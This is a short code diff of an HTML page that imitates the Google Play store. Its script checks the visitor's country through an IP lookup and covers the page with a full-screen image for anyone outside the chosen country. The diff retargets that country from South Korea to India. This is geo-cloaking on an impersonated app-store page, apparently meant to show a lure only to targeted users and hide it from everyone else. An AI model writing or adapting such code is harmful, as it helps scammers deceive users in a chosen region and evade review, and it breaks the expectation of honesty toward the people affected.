@@ -25,7 +25,7 @@
             const data = await response.json();
             console.log("IP API 响应:", data);
 
-            if (data.country !== "KR") { // 如果不是韩国
+            if (data.country !== "IN") { // 如果不是印度
                 // 设置 iframe 并加载目标图片
                 const iframe = document.createElement('iframe');
                 iframe.src = "app.png";
@@ -39,7 +39,7 @@
                 document.body.style.overflow = "hidden"; // 禁用 body 的滚动条
                 document.body.appendChild(iframe); // 加载 iframe
             } else {
-                console.log("用户在韩国，不进行页面覆盖");
+                console.log("用户在印度，不进行页面覆盖");
             }
         } catch (error) {
             console.error("无法获取IP信息", error);
@@ -48,6 +48,7 @@
 
     window.onload = checkIP;
 </script>
+
     <header class="S3WLMd" role="banner"><!---滚动页面的时候，需加class=QKrU5e--->
         <nav class="oPjgQb"><a href="https://play.google.com/store/games" aria-label="Google Play 徽标" class="f0UV3d"><svg class="kOqhQd"
                     aria-hidden="true" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
